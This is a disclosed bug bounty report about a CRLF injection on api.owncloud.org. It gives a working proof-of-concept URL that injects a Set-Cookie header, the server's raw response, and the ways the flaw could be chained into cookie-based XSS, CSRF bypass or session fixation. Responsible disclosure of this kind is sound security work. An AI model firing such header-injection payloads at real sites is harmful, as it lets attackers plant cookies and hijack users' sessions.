# [api.owncloud.org] CRLF Injection

## Report Details
- **Report ID**: 154306
- **URL**: https://hackerone.com/reports/154306
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-27T10:29:30.485Z
- **Disclosed**: 2016-11-02T13:38:48.259Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
**PoC**:
`https://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;`

**HTTP Response**:
```
HTTP/1.1 301 Moved Permanently\r\n
Date: Wed, 27 Jul 2016 10:28:01 GMT\r\n
Server: Apache\r\n
Strict-Transport-Security: max-age=63072000\r\n
X-Xss-Protection: 1; mode=block\r\n
Location: https://doc.owncloud.org/api/#\r                       < injection \r
Set-Cookie:crlf=injection;domain=.owncloud.org;\r\n
```

**Result**:
Creating a cookie-param "crlf=injection" on *.owncloud.org

This vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \r (%0d) is supported by any web browser other than FireFox.

## Attachments
No attachments
